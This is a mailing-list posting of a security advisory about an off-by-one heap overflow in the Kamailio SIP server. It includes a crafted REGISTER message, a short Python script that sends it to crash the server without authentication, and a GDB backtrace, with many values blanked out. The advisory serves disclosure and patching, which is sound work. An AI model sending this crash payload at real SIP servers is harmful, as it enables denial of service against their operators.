  oss-security - Kamailio heap overflow            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 20 Mar From: Sandro Gauci <sandro@...blesecurity.com> To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com,  fulldisclosure@...lists.org, voipsec@...psa.org,  submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org Subject: Kamailio heap overflow  # Off-by-one heap overflow in Kamailio  - Authors:     - Alfred Farrugia <alfred@...blesecurity.com>     - Sandro Gauci <sandro@...blesecurity.com> - Fixed versions: Kamailio and - References: no CVE assigned yet - Enable Security Advisory: - Tested vulnerable versions: - Timeline:     - Report date:     - Kamailio confirmed issue:     - Kamailio patch:     - Kamailio release with patch:     - Enable Security advisory:  ## Description  A specially crafted REGISTER message with a malformed `branch` or `From tag` triggers an off-by-one heap overflow.  ## Impact  Abuse of this vulnerability leads to denial of service in Kamailio. Further research may show that exploitation leads to remote code execution.  ## How to reproduce the issue  The following SIP message was used to reproduce the issue with a `From` header containing the `tag` that triggers the vulnerability:   ``` REGISTER SIP/2.0 Via: SIP/2.0/TCP To: From: Test Call-ID: Contact: Max-Forwards: 70 CSeq: REGISTER User-Agent: go SIP fuzzer/1 Content-Length: 0  ```  We used this python script to reproduce the crash:  ``` #!/usr/bin/env python import socket import sys  PROTO = "udp" SERVER_IP = SERVER_PORT =  for _ in range(2):     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)     sock.connect((sys.argv[1], int(sys.argv[2])))      msg = "REGISTER SIP/2.0\r\n" \         "Via: SIP/2.0/TCP \         "To: \         "From: Test \         "Call-ID: \         "Contact: \         "Max-Forwards: 70\r\n" \         "CSeq: REGISTER\r\n" \         "User-Agent: go SIP fuzzer/1\r\n" \         "Content-Length: 0\r\n" \         "\r\n"      sock.sendall(msg) ```   Run using:  ``` python crash.py <ip> <port> ```  The expected result is a crash in Kamailio.  Notes:   - authentication is not required - SIP extension does not need to exist - Message can be sent over TCP or UDP  ### GDB backtrace result  Both crashes produce a similar backtrace in GDB:  ``` #0  in __GI_raise (sig=sig@...ry=6) at ../sysdeps/unix/sysv/linux/raise.c:54 #1  in __GI_abort () at abort.c:89 #2  in qm_debug_frag "tmx: tmx_pretran.c", at #3  in qm_malloc "tmx: tmx_pretran.c", "tmx_check_pretran", "tmx") at #4  in qm_shm_malloc "tmx: tmx_pretran.c", "tmx_check_pretran", "tmx") at #5  in tmx_check_pretran at #6  in t_precheck_trans at #7  in w_t_precheck_trans at #8  in do_action at #9  in run_actions at #10 in run_actions_safe at #11 in rval_get_int cache=0x0) at #12 in rval_expr_eval_int at #13 in do_action at #14 in run_actions at #15 in do_action at #16 in run_actions at #17 in run_top_route c=0x0) at #18 in receive_msg (     <buf> "REGISTER SIP/2.0\r\nVia: SIP/2.0/TCP     at #19 in udp_rcv_loop () at #20 in main_loop () at #21 in main (argc=7, at (gdb) ```  This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.  ## Solutions and recommendations  Apply the patch at or make use of a release that includes that patch (e.g. or  Enable Security would like to thank Daniel-Constantin Mierla of the Kamailio Project for the very quick response and fix within hours of our report.  ## About Enable Security  [Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.  ## Disclaimer  The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      